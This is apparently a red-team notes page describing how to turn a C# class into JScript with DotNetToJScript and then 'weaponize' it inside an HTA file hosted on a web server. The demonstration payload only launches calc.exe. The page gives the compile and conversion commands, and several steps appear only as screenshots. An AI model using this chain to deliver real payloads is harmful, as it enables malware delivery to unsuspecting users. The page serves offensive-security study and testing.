# JS files - DotNetToJScript

## JS files - DotNetToJScript

### Usage

* **Create a simple C\# program \(public class...\)**

```csharp
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Windows.Forms;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

public class Hello
{
    public void Hellocal()
        {
            Process.Start("calc.exe");
            System.Windows.Forms.MessageBox.Show("hello from calc");


        }
}


```

Note the Class and the method name

![](../../../../.gitbook/assets/image%20%28297%29.png)

* **Compile it as a library:**

```text
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /platform:x86 /target:library hellocalc.cs
```

![](../../../../.gitbook/assets/image%20%28124%29.png)

* **Download latest DotNetToJScript and compile it \(x86 for x86 payload ...\)**

```csharp
 git clone https://github.com/tyranid/DotNetToJScript
```

* **Execute DotNetToJScript specify the Class name, an ouput file and the DLL.**

```text
 .\DotNetToJScript.exe -l JScript -c Hello -o output.txt .\hello.dll
```

* **Edit the output and add the method**

![](../../../../.gitbook/assets/image%20%2848%29.png)

### HTA Weaponize 

* **Add the edited output.txt to your HTA file :**

![](../../../../.gitbook/assets/image%20%28152%29.png)

![](../../../../.gitbook/assets/image%20%28123%29.png)

* **Host the file on a webserver :**

![](../../../../.gitbook/assets/image%20%28135%29.png)

![](../../../../.gitbook/assets/image%20%28106%29.png)

### \*\*\*\*

